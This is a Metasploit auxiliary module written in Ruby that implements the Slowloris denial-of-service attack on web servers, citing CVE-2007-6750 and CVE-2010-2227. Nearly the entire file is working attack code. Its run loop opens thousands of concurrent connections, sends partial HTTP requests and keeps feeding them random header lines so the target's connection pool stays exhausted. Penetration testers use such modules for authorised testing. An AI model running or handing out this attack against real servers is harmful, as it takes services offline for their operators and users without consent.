##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'Slow Loris DoS',
      'Description'     => %q{Slowloris tries to keep many connections to the target web server open and hold them open as long as possible.
                              It accomplishes this by opening connections to the target web server and sending a partial request.
                              Periodically, it will send subsequent requests, adding to but never completing the request.},
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'RSnake', # Vulnerability disclosure
          'Daniel Teixeira' # Metasploit module
        ],
      'References'      =>
        [
          [ 'CVE', '2007-6750' ],
          [ 'CVE', '2010-2227' ],
          [ 'URL', 'https://www.exploit-db.com/exploits/8976/' ]
        ],
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptInt.new('THREADS', [true, 'The number of concurrent threads', 5000]),
        OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 60])
      ])
  end

  def thread_count
    datastore['THREADS']
  end

  def timeout
    datastore['TIMEOUT']
  end

  def run
      starting_thread = 1
      header = "GET / HTTP/1.1\r\n"
      threads = []
      while true do

        ubound = [thread_count].min
        print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")

        1.upto(ubound) do |i|
          threads << framework.threads.spawn("Module(#{self.refname})-request#{(starting_thread - 1) + i}", false, i) do |i|
            begin
              connect()
              sock.puts(header)
              10.times do
                data = "X-a-#{rand(0..1000)}: b\r\n"
                sock.puts(data)
                sleep rand(1..15)
              end
            end
          end
        end
        threads.each(&:join)
        starting_thread += ubound
      end
  end
end
